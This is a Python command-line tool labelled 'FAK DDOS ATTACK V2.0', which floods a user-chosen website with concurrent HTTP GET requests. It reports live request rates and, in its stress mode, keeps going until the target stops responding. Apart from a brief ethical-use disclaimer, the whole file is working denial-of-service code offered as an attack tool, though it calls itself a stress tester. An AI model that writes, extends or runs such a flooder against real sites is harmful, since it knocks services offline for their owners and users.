#!/usr/bin/env python3
import argparse
import asyncio
import time
import statistics
import csv
import json
import sys
from collections import deque
from typing import List, Optional

import httpx
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.align import Align

# --- Global State & Configuration ---
console = Console()

class TestStats:
    """A class to hold and manage test statistics in a thread-safe manner."""
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.latencies: List[float] = []
        self.start_time = 0.0
        self.end_time = 0.0
        self._lock = asyncio.Lock()

    async def add_request(self, latency: float, success: bool):
        async with self._lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
            self.latencies.append(latency)

# --- UI & Banner (V2.0) ---

def display_intro():
    """Prints the application banner, owner details, and ethical use warning."""
    console.clear()
    
    # --- NEW, COMPACT BANNER FOR NARROW SCREENS (LIKE TERMUX) ---
    banner_art = """
██████╗  █████╗  ██╗  ██╗
██╔══  ╗██╔══██╗██║ ██╔╝
██████╔╝███████║█████╔╝ 
██╔═══╝ ██╔══██║██╔═██╗ 
██║     ██║  ██║██║  ██╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ 
    """
    
    banner_text = Text(banner_art, style="bold magenta", justify="center")
    title_text = Text("FAK DDOS ATTACK", style="bold green", justify="center")
    subtitle = Text("V2.0 - High-Performance DDOS Tool", style="cyan", justify="center")
    
    # Assemble the text elements for a clean layout
    combined_text = Text.assemble(
        banner_text,
        "\n",
        title_text,
        "\n\n",
        subtitle
    )

    banner_panel = Panel(
        combined_text,
        title="[bold white]Welcome[/bold white]",
        border_style="green",
        padding=(1, 2)
    )

    owner_panel = Panel(
        Text(
            "Developed by: [bold]FAIZAN AHMAD KHICHI[/bold]\n"
            "WhatsApp Channel: [link=https://whatsapp.com/channel/0029Vb2y2umF6sn16F6Zm20k]Click to Join[/link]",
            justify="center",
            style="white"
        ),
        title="[bold blue]Owner Details[/bold blue]",
        border_style="blue"
    )

    warning_panel = Panel(
        Text(
            "⚠️ [bold]Ethical Use Warning[/bold] ⚠️\n"
            "This tool is for educational and testing purposes only. "
            "Only use it on websites you own or have explicit permission to ATTACK. "
            "Unauthorized ATTACK is illegal and unethical.",
            justify="center",
            style="yellow"
        ),
        title="[bold red]Disclaimer[/bold red]",
        border_style="red"
    )

    console.print(banner_panel)
    console.print(owner_panel)
    console.print(warning_panel)
    console.print()

def get_user_inputs(args: argparse.Namespace) -> argparse.Namespace:
    """Prompts user for inputs if not provided via CLI arguments."""
    
    if not args.url:
        while True:
            url = Prompt.ask("[bold green]Enter the target website URL to ATTACK[/bold green]")
            if url.startswith("http://") or url.startswith("https://"):
                args.url = url
                break
            else:
                console.print("[bold red]Invalid URL. Please include 'http://' or 'https://'.[/bold red]")

    if not args.concurrency:
        args.concurrency = IntPrompt.ask(
            "[bold green]Enter the number of concurrent requests[/bold green]",
            default=100
        )
    
    console.print("\n[bold]Test Configuration:[/bold]")
    config_table = Table(show_header=False, box=None)
    config_table.add_column(style="cyan")
    config_table.add_column()
    config_table.add_row("Target URL", f"[bold white]{args.url}[/bold white]")
    config_table.add_row("Concurrency", f"[bold white]{args.concurrency} workers[/bold white]")
    config_table.add_row("Test Mode", f"[bold white]{args.mode.capitalize()}[/bold white]")
    config_table.add_row("Request Timeout", f"[bold white]{args.timeout} seconds[/bold white]")
    if args.mode == 'benchmark':
        config_table.add_row("Test Duration", f"[bold white]{args.duration} seconds[/bold white]")
    if args.output:
        config_table.add_row("Export Results To", f"[bold white]{args.output}[/bold white]")
    
    console.print(config_table)

    if not Confirm.ask("\n[bold yellow]Proceed with the DDOS?[/bold yellow]", default=True):
        console.print("[bold red]Test cancelled by user.[/bold red]")
        sys.exit(0)
    
    return args


# --- Core Logic ---

async def worker(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    stats: TestStats,
    stop_event: asyncio.Event
):
    """A worker coroutine that continuously sends GET requests to the target URL."""
    while not stop_event.is_set():
        start_time = time.monotonic()
        try:
            response = await client.get(url, timeout=timeout)
            latency = time.monotonic() - start_time
            if 200 <= response.status_code < 400:
                await stats.add_request(latency, success=True)
            else:
                await stats.add_request(latency, success=False)
        except httpx.RequestError:
            latency = time.monotonic() - start_time
            await stats.add_request(latency, success=False)
        except Exception:
            latency = time.monotonic() - start_time
            await stats.add_request(latency, success=False)

class StressTester:
    """Orchestrates the stress test, including setup, execution, and reporting."""

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.stats = TestStats()
        self.stop_event = asyncio.Event()
        self.rps_history = deque(maxlen=10)

    async def run(self):
        """Main entry point to start the test."""
        self.stats.start_time = time.monotonic()

        console.print(f"\n[bold blue]Starting {self.args.mode.capitalize()} ATTACK...[/bold blue]")
        console.print("[yellow]Press CTRL+C to stop the ATTACK gracefully.[/yellow]\n")
        
        try:
            async with httpx.AsyncClient() as client:
                progress_task = asyncio.create_task(self.progress_display())
                worker_tasks = [
                    asyncio.create_task(
                        worker(client, self.args.url, self.args.timeout, self.stats, self.stop_event)
                    )
                    for _ in range(self.args.concurrency)
                ]
                await asyncio.gather(progress_task, *worker_tasks)
        except asyncio.CancelledError:
            pass
        finally:
            self.stop_event.set()
            self.stats.end_time = time.monotonic()

    async def progress_display(self):
        """Displays real-time progress and handles test termination."""
        last_total_requests = 0
        consecutive_failures = 0
        
        progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        )
        if self.args.mode == 'benchmark':
            task_id = progress.add_task("[cyan]Benchmark Progress[/cyan]", total=self.args.duration)

        with Live(console=console, auto_refresh=False) as live:
            start_time = time.monotonic()
            while not self.stop_event.is_set():
                await asyncio.sleep(1)
                
                current_total_requests = self.stats.total_requests
                rps = current_total_requests - last_total_requests
                last_total_requests = current_total_requests
                self.rps_history.append(rps)
                
                table = self.generate_live_table(rps)
                
                if self.args.mode == 'benchmark':
                    elapsed = time.monotonic() - start_time
                    progress.update(task_id, completed=elapsed)
                    display_group = Panel(
                        Align.center(table), 
                        title="Live Stats", 
                        border_style="blue",
                        subtitle=f"Elapsed: {int(elapsed)}s / {self.args.duration}s"
                    )
                    if elapsed >= self.args.duration:
                        live.update(display_group)
                        live.refresh()
                        console.print("\n[bold green]Benchmark duration reached. Stopping...[/bold green]")
                        self.stop_event.set()
                        break
                else: # Stress mode
                    display_group = Panel(Align.center(table), title="Live Stats", border_style="blue")
                    if rps == 0 and self.stats.total_requests > self.args.concurrency:
                        consecutive_failures += 1
                    else:
                        consecutive_failures = 0
                    
                    if consecutive_failures >= 5:
                        console.print("\n[bold red]Server appears unresponsive! (Zero RPS for 5 consecutive seconds)[/bold red]")
                        console.print(f"Approximate maximum successful requests: [bold green]{self.stats.successful_requests}[/bold green]")
                        self.stop_event.set()
                        break
                
                live.update(display_group)
                live.refresh()
    
    def generate_live_table(self, rps: int) -> Table:
        table = Table(box=None, show_header=False)
        table.add_column(style="cyan")
        table.add_column(style="magenta", justify="right")
        table.add_row("Total Requests", f"{self.stats.total_requests}")
        table.add_row("[green]Successful[/green]", f"{self.stats.successful_requests}")
        table.add_row("[red]Failed[/red]", f"{self.stats.failed_requests}")
        table.add_row("Requests/Sec (RPS)", f"[bold]{rps}[/bold]")
        success_rate = (self.stats.successful_requests / self.stats.total_requests * 100) if self.stats.total_requests > 0 else 100
        table.add_row("Success Rate", f"{success_rate:.2f}%")
        return table

    def print_summary(self):
        console.rule("[bold green]Test Summary Report[/bold green]", style="green")
        if self.stats.total_requests == 0:
            console.print("[yellow]No requests were sent.[/yellow]")
            return
            
        total_runtime = self.stats.end_time - self.stats.start_time
        avg_rps = self.stats.total_requests / total_runtime if total_runtime > 0 else 0
        max_rps = max(self.rps_history) if self.rps_history else 0
        
        avg_latency = statistics.mean(self.stats.latencies) * 1000
        min_latency = min(self.stats.latencies) * 1000
        max_latency = max(self.stats.latencies) * 1000
        sorted_latencies = sorted(self.stats.latencies)
        p95_index = int(len(sorted_latencies) * 0.95)
        p95_latency = sorted_latencies[p95_index] * 1000
        
        summary_table = Table(title="Performance Metrics")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="magenta")
        summary_table.add_row("Total Runtime", f"{total_runtime:.2f} seconds")
        summary_table.add_row("Avg Requests/Sec (RPS)", f"{avg_rps:.2f}")
        summary_table.add_row("Max Requests/Sec (RPS)", f"{max_rps}")
        summary_table.add_row("[green]Successful Requests[/green]", f"{self.stats.successful_requests}")
        summary_table.add_row("[red]Failed Requests[/red]", f"{self.stats.failed_requests}")

        latency_table = Table(title="Response Time Distribution")
        latency_table.add_column("Metric", style="cyan")
        latency_table.add_column("Value (ms)", style="magenta")
        latency_table.add_row("Average", f"{avg_latency:.2f}")
        latency_table.add_row("Min", f"{min_latency:.2f}")
        latency_table.add_row("Max", f"{max_latency:.2f}")
        latency_table.add_row("95th Percentile (p95)", f"{p95_latency:.2f}")

        console.print(summary_table)
        console.print(latency_table)

    def export_results(self):
        """Exports the test results to a CSV or JSON file if requested."""
        if not self.args.output: return
        console.print(f"\n[bold blue]Exporting results to {self.args.output}...[/bold blue]")
        total_runtime = self.stats.end_time - self.stats.start_time
        results_data = {
            "target_url": self.args.url, "mode": self.args.mode, "concurrency": self.args.concurrency,
            "total_runtime_sec": round(total_runtime, 2), "total_requests": self.stats.total_requests,
            "successful_requests": self.stats.successful_requests, "failed_requests": self.stats.failed_requests,
            "avg_rps": round(self.stats.total_requests / total_runtime if total_runtime > 0 else 0, 2),
            "max_rps": max(self.rps_history) if self.rps_history else 0,
            "latency_ms": {
                "average": round(statistics.mean(self.stats.latencies) * 1000, 2) if self.stats.latencies else 0,
                "min": round(min(self.stats.latencies) * 1000, 2) if self.stats.latencies else 0,
                "max": round(max(self.stats.latencies) * 1000, 2) if self.stats.latencies else 0,
                "p95": round(sorted(self.stats.latencies)[int(len(self.stats.latencies) * 0.95)] * 1000, 2) if len(self.stats.latencies) > 20 else 0,
            }
        }
        try:
            if self.args.output.lower().endswith('.json'):
                with open(self.args.output, 'w') as f: json.dump(results_data, f, indent=4)
            elif self.args.output.lower().endswith('.csv'):
                with open(self.args.output, 'w', newline='') as f:
                    writer = csv.writer(f)
                    flat_data = results_data.copy()
                    latency_data = flat_data.pop("latency_ms")
                    flat_data.update({f"latency_ms_{k}": v for k, v in latency_data.items()})
                    writer.writerow(flat_data.keys())
                    writer.writerow(flat_data.values())
            else:
                console.print(f"[bold red]Error: Unsupported output format. Use .json or .csv.[/bold red]")
                return
            console.print(f"[bold green]Successfully exported results to {self.args.output}[/bold green]")
        except IOError as e:
            console.print(f"[bold red]Error writing to file {self.args.output}: {e}[/bold red]")


def main():
    """Parses CLI arguments and initiates the stress test."""
    parser = argparse.ArgumentParser(description="FAK DDOS ATTACK V2.0")
    parser.add_argument("-u", "--url", help="The target URL to ATTACK. (Optional: will prompt if not provided)")
    parser.add_argument("-c", "--concurrency", type=int, help="Number of concurrent requests. (Optional: will prompt if not provided)")
    parser.add_argument("-t", "--timeout", type=float, default=10.0, help="Request timeout in seconds. (Default: 10.0)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration of the test in seconds ('benchmark' mode only). (Default: 30)")
    parser.add_argument("-m", "--mode", choices=['stress', 'benchmark'], default='stress', help="Test mode. (Default: stress)")
    parser.add_argument("-o", "--output", help="File path to export results (e.g., results.json or results.csv).")
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 2.0')
    
    args = parser.parse_args()

    display_intro()
    
    try:
        args = get_user_inputs(args)
    except (KeyboardInterrupt, EOFError):
        # Catches CTRL+C or CTRL+D during input
        console.print("\n[bold red]Operation cancelled by user.[/bold red]")
        return
        
    tester = StressTester(args)
    try:
        asyncio.run(tester.run())
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow] ATTACK interrupted by user. Shutting down gracefully...[/bold yellow]")
    finally:
        if tester.stats.total_requests > 0:
            tester.print_summary()
            tester.export_results()
        else:
            console.print("\n[yellow]Test stopped before any requests were completed.[/yellow]")

if __name__ == "__main__":
    main()
